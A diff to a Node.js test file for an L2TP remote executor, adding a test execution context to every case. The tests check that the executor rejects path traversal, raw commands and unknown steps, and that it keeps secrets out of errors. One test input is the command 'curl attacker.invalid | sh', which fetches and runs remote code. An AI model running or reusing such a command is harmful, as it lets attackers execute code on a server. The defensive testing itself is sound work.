@@ -1,4 +1,5 @@
 'use strict';
+const { TEST_TOPOLOGY_EXECUTION_CONTEXT: TEST } = require('../domain/topologyExecutionContext');
 
 const assert = require('node:assert/strict');
 const test = require('node:test');
@@ -41,11 +42,11 @@ function materializedArtifactsFor(type) {
 
 test('preflight uploads its root-only desired file before its fixed command', async () => {
     const transport = createTransport();
-    const executor = new L2tpRemoteExecutor({ transport });
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
     const secret = 'vpn-psk-must-not-leak';
 
     const result = await executor.executeStep({
-        operation: { id: 'operation-17' },
+        operation: { executionContext: TEST, id: 'operation-17' },
         step: {
             type: 'preflight',
             artifacts: [{
@@ -88,7 +89,7 @@ test('preflight uploads its root-only desired file before its fixed command', as
 
 test('executor rejects a definitive negative preflight before any subsequent command', async () => {
     const commands = [];
-    const executor = new L2tpRemoteExecutor({ transport: {
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport: {
         async uploadRootFile() {},
         async runArtifactCommand(request) {
             commands.push(request.command);
@@ -96,7 +97,7 @@ test('executor rejects a definitive negative preflight before any subsequent com
         },
     } });
     await assert.rejects(executor.executeStep({
-        operation: { id: 'operation-preflight-negative' },
+        operation: { executionContext: TEST, id: 'operation-preflight-negative' },
         step: { type: 'preflight', artifacts: [{ type: 'desired', path: 'desired.json', content: '{}' }] },
     }), error => error.code === 'UNSUPPORTED_OS' && error.remoteOutcomeUncertain !== true);
     assert.deepEqual(commands, ['preflight']);
@@ -104,11 +105,11 @@ test('executor rejects a definitive negative preflight before any subsequent com
 
 test('compose uploads only the fixed Xray candidate artifact before its fixed command', async () => {
     const transport = createTransport();
-    const executor = new L2tpRemoteExecutor({ transport });
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
     const content = '{"inbounds":[],"outbounds":[],"routing":{"rules":[]},"marker":"private-candidate"}';
 
     const result = await executor.executeStep({
-        operation: { id: 'operation-candidate' },
+        operation: { executionContext: TEST, id: 'operation-candidate' },
         step: {
             type: 'compose_xray_fragment',
             artifacts: [{ type: 'xrayCandidate', path: 'xray-candidate.json', content }],
@@ -147,11 +148,11 @@ test('compose uploads only the fixed Xray candidate artifact before its fixed co
 
 test('maps every install-plan step to its same-name allowlisted command', async () => {
     const transport = createTransport();
-    const executor = new L2tpRemoteExecutor({ transport });
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
     for (const type of INSTALL_STEP_TYPES) {
         await executor.executeStep({
-            operation: { id: 'operation-all-steps' },
+            operation: { executionContext: TEST, id: 'operation-all-steps' },
             step: {
                 type,
                 ...(materializedArtifactsFor(type) === undefined
@@ -195,10 +196,10 @@ test('standalone sync_users uploads exact transient desired users and records on
             return request.command === 'verify-users' ? verifierResult : { ok: true };
         },
     };
-    const executor = new L2tpRemoteExecutor({ transport });
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
     const result = await executor.executeStep({
-        operation: {
+        operation: { executionContext: TEST,
             id: 'operation-standalone-users',
             kind: 'sync_users',
             plan: { desired: { credentialRevision: 42 } },
@@ -259,8 +260,8 @@ test('verify_users maps to the fixed verifier command with the cached typed expe
             return request.command === 'verify-users' ? verifierResult : { ok: true };
         },
     };
-    const executor = new L2tpRemoteExecutor({ transport });
-    const operation = {
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
+    const operation = { executionContext: TEST,
         id: 'operation-explicit-user-verify',
         kind: 'sync_users',
         plan: { desired: { credentialRevision: 42 } },
@@ -297,7 +298,7 @@ test('verify_users returns a strict sanitized unmanaged-collision attestation', 
         managedUserCount: 1,
         code: 'UNMANAGED_USERS_COLLISION',
     };
-    const executor = new L2tpRemoteExecutor({
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST,
         transport: {
             async uploadRootFile() {},
             async runArtifactCommand({ command }) {
@@ -306,7 +307,7 @@ test('verify_users returns a strict sanitized unmanaged-collision attestation', 
         },
     });
 
-    const operation = {
+    const operation = { executionContext: TEST,
         id: 'operation-user-mismatch',
         kind: 'sync_users',
         plan: { desired: { credentialRevision: 42 } },
@@ -394,10 +395,10 @@ test('standalone sync_users rejects missing, foreign, malformed, and wrong-revis
 
     for (const step of invalidSteps) {
         const transport = createTransport();
-        const executor = new L2tpRemoteExecutor({ transport });
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
         await assert.rejects(
             executor.executeStep({
-                operation: {
+                operation: { executionContext: TEST,
                     id: 'operation-invalid-users',
                     kind: 'sync_users',
                     plan: { desired: { credentialRevision: 42 } },
@@ -447,8 +448,8 @@ test('standalone sync_users rejects untrusted verifier results without leaking t
                 return command === 'verify-users' ? invalidResult : { ok: true };
             },
         };
-        const executor = new L2tpRemoteExecutor({ transport });
-        const operation = {
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
+        const operation = { executionContext: TEST,
             id: 'operation-untrusted-verifier',
             kind: 'sync_users',
             plan: { desired: { credentialRevision: 42 } },
@@ -530,11 +531,11 @@ test('requires exactly one materialized typed artifact only on its three declare
 
     for (const { step } of invalidCases) {
         const transport = createTransport();
-        const executor = new L2tpRemoteExecutor({ transport });
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
         await assert.rejects(
             executor.executeStep({
-                operation: { id: 'operation-exact-artifacts' },
+                operation: { executionContext: TEST, id: 'operation-exact-artifacts' },
                 step,
             }),
             error => {
@@ -550,11 +551,11 @@ test('requires exactly one materialized typed artifact only on its three declare
 
 test('rejects unknown step types before invoking the transport', async () => {
     const transport = createTransport();
-    const executor = new L2tpRemoteExecutor({ transport });
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
     await assert.rejects(
         executor.executeStep({
-            operation: { id: 'operation-unknown' },
+            operation: { executionContext: TEST, id: 'operation-unknown' },
             step: {
                 type: 'run_ui_shell',
                 command: 'curl attacker.invalid | sh',
@@ -586,11 +587,11 @@ test('rejects artifact path traversal before upload or command execution', async
 
     for (const path of traversalPaths) {
         const transport = createTransport();
-        const executor = new L2tpRemoteExecutor({ transport });
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
         await assert.rejects(
             executor.executeStep({
-                operation: { id: 'operation-safe' },
+                operation: { executionContext: TEST, id: 'operation-safe' },
                 step: {
                     type: 'preflight',
                     artifacts: [{ type: 'desired', path, content: '{}' }],
@@ -638,11 +639,11 @@ test('rejects artifacts outside the typed step and filename allowlist', async ()
 
     for (const { step, artifact } of invalidCases) {
         const transport = createTransport();
-        const executor = new L2tpRemoteExecutor({ transport });
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
         await assert.rejects(
             executor.executeStep({
-                operation: { id: 'operation-artifact-allowlist' },
+                operation: { executionContext: TEST, id: 'operation-artifact-allowlist' },
                 step: { type: step, artifacts: [artifact] },
             }),
             error => {
@@ -671,11 +672,11 @@ test('rejects caller-supplied raw commands and argv even for an allowed step', a
 
     for (const rawInput of rawInputs) {
         const transport = createTransport();
-        const executor = new L2tpRemoteExecutor({ transport });
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
 
         await assert.rejects(
             executor.executeStep({
-                operation: { id: 'operation-no-shell' },
+                operation: { executionContext: TEST, id: 'operation-no-shell' },
                 step: { type: 'preflight', ...rawInput },
             }),
             error => {
@@ -692,11 +693,11 @@ test('rejects caller-supplied raw commands and argv even for an allowed step', a
 
 test('rollback issues exactly one typed fixed command without failure details or secrets', async () => {
     const transport = createTransport();
-    const executor = new L2tpRemoteExecutor({ transport });
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport });
     const secret = 'rollback-error-secret';
 
     const result = await executor.rollback({
-        operation: { id: 'operation-rollback' },
+        operation: { executionContext: TEST, id: 'operation-rollback' },
         completedSteps: [{ type: 'backup' }, { type: 'stage_managed_files' }],
         failedStep: { type: 'start_l2tp' },
         error: new Error(`remote failed with ${secret}`),
@@ -753,11 +754,11 @@ test('sanitizes upload and command transport failures before returning them', as
     ];
 
     for (const testCase of cases) {
-        const executor = new L2tpRemoteExecutor({ transport: testCase.transport });
+        const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport: testCase.transport });
 
         await assert.rejects(
             executor.executeStep({
-                operation: { id: 'operation-transport-failure' },
+                operation: { executionContext: TEST, id: 'operation-transport-failure' },
                 step: testCase.step,
             }),
             error => {
@@ -774,7 +775,7 @@ test('sanitizes upload and command transport failures before returning them', as
 });
 
 test('executor preserves only the sanitized remote uncertainty bit for a rejected SSH call', async () => {
-    const executor = new L2tpRemoteExecutor({ transport: {
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transport: {
         async runArtifactCommand() {
             throw Object.assign(new Error('secret from transport'), {
                 code: 'REMOTE_COMMAND_FAILED', remoteOutcomeUncertain: true,
@@ -782,7 +783,7 @@ test('executor preserves only the sanitized remote uncertainty bit for a rejecte
         },
     } });
     await assert.rejects(executor.executeStep({
-        operation: { id: 'operation-uncertain' }, step: { type: 'verify' },
+        operation: { executionContext: TEST, id: 'operation-uncertain' }, step: { type: 'verify' },
     }), error => error.code === 'REMOTE_COMMAND_FAILED'
         && error.remoteOutcomeUncertain === true
         && error.message === 'Failed to run an L2TP artifact command'
@@ -806,9 +807,9 @@ test('resolves one lazy transport per claimed operation and reuses it for every 
         transports.set(request.operationId, transport);
         return transport;
     };
-    const executor = new L2tpRemoteExecutor({ transportResolver });
-    const first = { id: 'operation-lazy-a', node: 'relay-a' };
-    const second = { id: 'operation-lazy-b', node: { _id: 'relay-b' } };
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST, transportResolver });
+    const first = { executionContext: TEST, id: 'operation-lazy-a', node: 'relay-a' };
+    const second = { executionContext: TEST, id: 'operation-lazy-b', node: { _id: 'relay-b' } };
 
     assert.deepEqual(resolverCalls, []);
     assert.deepEqual(transportCalls, []);
@@ -819,8 +820,8 @@ test('resolves one lazy transport per claimed operation and reuses it for every 
     await executor.executeStep({ operation: second, step: { type: 'verify' } });
 
     assert.deepEqual(resolverCalls, [
-        { operationId: 'operation-lazy-a', nodeId: 'relay-a' },
-        { operationId: 'operation-lazy-b', nodeId: 'relay-b' },
+        { executionContext: TEST, operationId: 'operation-lazy-a', nodeId: 'relay-a' },
+        { executionContext: TEST, operationId: 'operation-lazy-b', nodeId: 'relay-b' },
     ]);
     assert.equal(transports.size, 2);
     assert.deepEqual(
@@ -837,13 +838,13 @@ test('resolves one lazy transport per claimed operation and reuses it for every 
 test('sanitizes resolver failures and never attempts a remote call', async () => {
     const secret = 'resolver-database-password';
     const resolverCalls = [];
-    const executor = new L2tpRemoteExecutor({
+    const executor = new L2tpRemoteExecutor({ executionContext: TEST,
         async transportResolver(request) {
             resolverCalls.push(request);
             throw new Error(`lookup failed with ${secret}`);
         },
     });
-    const operation = { id: 'operation-unavailable', node: 'relay-unavailable' };
+    const operation = { executionContext: TEST, id: 'operation-unavailable', node: 'relay-unavailable' };
 
     for (const action of [
         () => executor.executeStep({ operation, step: { type: 'verify' } }),
@@ -863,6 +864,7 @@ test('sanitizes resolver failures and never attempts a remote call', async () =>
     }
 
     assert.deepEqual(resolverCalls, [{
+        executionContext: TEST,
         operationId: 'operation-unavailable',
         nodeId: 'relay-unavailable',
     }]);
